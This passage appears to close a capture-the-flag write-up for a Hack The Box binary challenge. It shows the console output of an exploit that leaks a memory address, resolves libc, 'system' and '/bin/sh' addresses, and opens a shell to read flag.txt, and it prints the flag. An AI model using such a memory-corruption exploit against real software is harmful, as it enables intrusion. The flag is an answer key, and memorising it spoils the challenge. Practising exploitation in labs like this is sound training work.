                  ▒         ▓▓▓▓▓▓▓▓    ▓▓▓▓▓▓▓▓▓▓▓▓▓                           
                           ▓▓▓▓▓▓▓    ▓▓▓▓▓▓▓▓▓▓▓▓                              
                           ▓▓▓▓▓    ▓▓▓▓▓▓▓▓▓▓                                  
                         ░  ▓▓    ▓▓▓▓▓▓▓▓▓▓                                    
      ▓                 ▒░      ▓▓▓▓▓▓▓▓                                        
                     ░▒▒  ▓      ▓▓▓▓▓        ▒                     ▒           
                   ░▒▒                                              ▓           
                  ▒▒▒       ▒▒                                                  
                ░▒▒░      ▒▒░       ░                                           
               ░▒▒░   ░▒▒▒░         ░                                           
              ░▒▒▒▒▒▒▒▒░            ▒                                           
             ▒▒▒▒▒▒▒░                                                           
            ░▒▒▒▒                                                               
           ░░                                               ▒                   



1. Show missiles 🚀
2. Change target's location 🎯
>> 

[*] Current target's coordinates: x = [0x53e5854620fb399f], y = [0x576b96b95df201f9]

[*] Insert new coordinates: x = [0x53e5854620fb399f], y = 
### Processing Output ########################

[*] New coordinates: x = [0x53e5854620fb399f], y = 
m��\x92U
[*] Verify new coordinates? (y/n): 
['', '[*] New coordinates: x = [0x53e5854620fb399f], y = ', 'm\xc4\xe7\x92U', '[*] Verify new coordinates? (y/n): ']
vuln: ['\nm\xc4\xe7\x92U']
\x55\x92\xe7\xc4\x6d\x0a
0x5592e7c46d0a
\x00\x00\x55\x92\xe7\xc4\x60\x00
\x00\x00\x55\x92\xe7\xc4\x6c\x39
0x7f5c8bf216a0


                                 Missile Launcher!


                                                                                
                                                                                
                                                                                
                                                                                
                       ░                                                        
                                                        ░      ░                
                                                     ▓▓             ░           
                                                 ▓▓▓▓▓▓              ▒          
             ▒  ▒                              ▓▓▓▓▓▓▓▓▓▓                       
                                             ▓▓▓▓▓▓▓▓▓▓▓▓▓            ░         
                                            ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓          ░         
                                           ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓        ░         
                                         ▓▓▓▓▓▓▒▒░▒░▒░▓▓▓▓▓▓▓▓▓▓▓               
                                       ▓▓▓▓▓▓▒▒       ░░▓▓▓▓▓▓▓▓▓▓▓▓▓           
                                     ▒▓▓▓▓▓▓▓▒         ░░▓▓▓▓▓▓▓▓▓▓▓            
                                    ▓▓▓▓▓▓▓▓▒▒          ░▓▓▓▓▓▓▓▓▓▓             
                                  ▒▓▓▓▓▓▓▓▓▓▓▒         ░▓▓▓▓▓▓▓▓▓               
                          ░       ▓▓▓▓▓▓▓▓▓▓▓▓▒░░   ░░░▓▓▓▓▓▓▓▓                 
                                ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒ ▓▓▓▓▓▓▓▓                    
                               ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓                      
                             ▓▓▓▓▓▓▓▓▓   ▓▓▓▓▓▓▓▓▓▓▓▓▓▓                         
                  ▒         ▓▓▓▓▓▓▓▓    ▓▓▓▓▓▓▓▓▓▓▓▓▓                           
                           ▓▓▓▓▓▓▓    ▓▓▓▓▓▓▓▓▓▓▓▓                              
                           ▓▓▓▓▓    ▓▓▓▓▓▓▓▓▓▓                                  
                         ░  ▓▓    ▓▓▓▓▓▓▓▓▓▓                               
     
      ▓                 ▒░      ▓▓▓▓▓▓▓▓                                        
                     ░▒▒  ▓      ▓▓▓▓▓        ▒                     ▒           
                   ░▒▒                                              ▓           
                  ▒▒▒       ▒▒                                                  
                ░▒▒░      ▒▒░       ░                                           
               ░▒▒░   ░▒▒▒░         ░                                           
              ░▒▒▒▒▒▒▒▒░            ▒                                           
             ▒▒▒▒▒▒▒░                                                           
            ░▒▒▒▒                                                               
           ░░                                               ▒                   



1. Show missiles 🚀
2. Change target's location 🎯
>> 
[*] libc: 0x7f5c8beb2000 
[*] bin/sh: 0x7f5c8c03ee57 
[*] system: 0x7f5c8bef73a0 
[*] Switching to interactive mode

[*] Current target's coordinates: x = [0x53e5854620fb399f], y = [0x576b96b95df201f9]

[*] Insert new coordinates: x = [0x53e5854620fb399f], y = 
[*] New coordinates: x = [0x53e5854620fb399f], y = 
m��\x92U
[*] Verify new coordinates? (y/n): 
[-] Permission Denied! You need flag.txt in order to proceed. Coordinates have been reset!
$ ls
core
flag.txt
glibc
sp_retribution
$ cat flag.txt
HTB{d0_n0t_3v3R_pr355_th3_butt0n}
[*] Got EOF while reading in interactive
$ 
```

## Flag

`HTB{d0_n0t_3v3R_pr355_th3_butt0n}`